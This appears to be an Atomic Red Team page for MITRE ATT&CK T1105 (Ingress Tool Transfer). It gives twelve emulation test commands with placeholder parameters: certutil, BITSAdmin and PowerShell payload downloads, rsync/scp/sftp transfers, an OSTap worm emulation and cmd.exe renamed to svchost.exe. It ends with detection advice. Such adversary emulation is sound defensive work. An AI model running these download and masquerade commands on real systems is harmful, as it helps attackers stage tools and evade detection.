# T1105 - Ingress Tool Transfer
Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - rsync remote file copy (push)
Utilize rsync to perform a remote file copy (push)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
```

Invoke-AtomicTest T1105 -TestNumbers 1

### Atomic Test #2 - rsync remote file copy (pull)
Utilize rsync to perform a remote file copy (pull)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
```

Invoke-AtomicTest T1105 -TestNumbers 2

### Atomic Test #3 - scp remote file copy (push)
Utilize scp to perform a remote file copy (push)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
scp #{local_file} #{username}@#{remote_host}:#{remote_path}
```

Invoke-AtomicTest T1105 -TestNumbers 3

### Atomic Test #4 - scp remote file copy (pull)
Utilize scp to perform a remote file copy (pull)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
scp #{username}@#{remote_host}:#{remote_file} #{local_path}
```

Invoke-AtomicTest T1105 -TestNumbers 4

### Atomic Test #5 - sftp remote file copy (push)
Utilize sftp to perform a remote file copy (push)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
```

Invoke-AtomicTest T1105 -TestNumbers 5

### Atomic Test #6 - sftp remote file copy (pull)
Utilize sftp to perform a remote file copy (pull)

**Supported Platforms:** linux, macos
#### Attack Commands: Run with `bash`
```bash
sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
```

Invoke-AtomicTest T1105 -TestNumbers 6

### Atomic Test #7 - certutil download (urlcache)
Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
```

Invoke-AtomicTest T1105 -TestNumbers 7

### Atomic Test #8 - certutil download (verifyctl)
Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f #{remote_file}
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
```

Invoke-AtomicTest T1105 -TestNumbers 8

### Atomic Test #9 - Windows - BITSAdmin BITS Download
This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
This technique is used by Qbot malware to download payloads.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
```

Invoke-AtomicTest T1105 -TestNumbers 9

### Atomic Test #10 - Windows - PowerShell Download
This test uses PowerShell to download a payload.
This technique is used by multiple adversaries and malware families.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
(New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
```

Invoke-AtomicTest T1105 -TestNumbers 10

### Atomic Test #11 - OSTAP Worming Activity
OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
pushd #{destination_path}
echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd
```

Invoke-AtomicTest T1105 -TestNumbers 11

### Atomic Test #12 - svchost writing a file to a UNC path
svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
```

Invoke-AtomicTest T1105 -TestNumbers 12

## Detection
Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)